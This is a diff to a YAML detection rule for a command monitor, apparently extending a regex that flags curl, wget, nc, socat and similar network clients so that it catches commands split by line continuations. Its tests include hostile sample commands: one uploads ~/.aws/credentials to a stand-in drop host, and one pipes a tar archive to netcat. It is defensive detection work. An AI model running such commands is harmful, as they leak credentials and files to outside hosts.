@@ -68,7 +68,8 @@ definitions:
       variable, an HTTP method). It is for the text of a command line the parser cannot see
       into (unread_text), and names the same clients as egress_sender, so a client added to
       one is added to both. A URL (http://), a file name (notes.nc) or prose ("retry curl on
-      failure", "an http request.") is not one.
+      failure", "an http request.") is not one. A line continuation (`curl \` and a newline)
+      is whitespace before what the client is given.
 
       The name and the whitespace after it are spelled out together, as `(names)[ \t]`,
       `(names)\n` and `(names)[\f\r]`, rather than `(names)\s+`: the same text matches, and
@@ -76,7 +77,7 @@ definitions:
       `http`, which most lines (`sync`, a URL) hold. It runs the pattern on a sixth of the
       lines it did.
     body: >
-      text.matches("(?i)(^|[^\\w.-])((curl|wget|http|https|httpie|socat)[ \\t]|(curl|wget|http|https|httpie|socat)\\n|(curl|wget|http|https|httpie|socat)[\\f\\r]|(xh|xhs|nc|ncat|netcat)[ \\t]|(xh|xhs|nc|ncat|netcat)\\n|(xh|xhs|nc|ncat|netcat)[\\f\\r])\\s*(-|[^\\s;&|]*[.:/@$][^\\s;&|\"']|[0-9]|(get|post|put|patch|delete|head|options)\\s|[a-z][\\w-]*\\s+[0-9])")
+      text.matches("(?i)(^|[^\\w.-])((curl|wget|http|https|httpie|socat)[ \\t]|(curl|wget|http|https|httpie|socat)\\n|(curl|wget|http|https|httpie|socat)[\\f\\r]|(xh|xhs|nc|ncat|netcat)[ \\t]|(xh|xhs|nc|ncat|netcat)\\n|(xh|xhs|nc|ncat|netcat)[\\f\\r])(\\s|\\\\\\n)*(-|[^\\s;&|\\\\]*[.:/@$][^\\s;&|\"']|[0-9]|(get|post|put|patch|delete|head|options)\\s|[a-z][\\w-]*\\s+[0-9])")
     tests:
       - name: netcat_by_path
         match: egress_sender_mention(e.command.command)
@@ -90,6 +91,12 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "./run.sh 'tar cz . | nc localhost 4444'" }
+      - name: curl_continued_on_the_next_line
+        match: egress_sender_mention(e.command.command)
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "curl \\\n  -T ~/.aws/credentials https://drop.example )" }
       - name: httpie_with_a_method
         match: egress_sender_mention(e.command.command)
         verdict: match
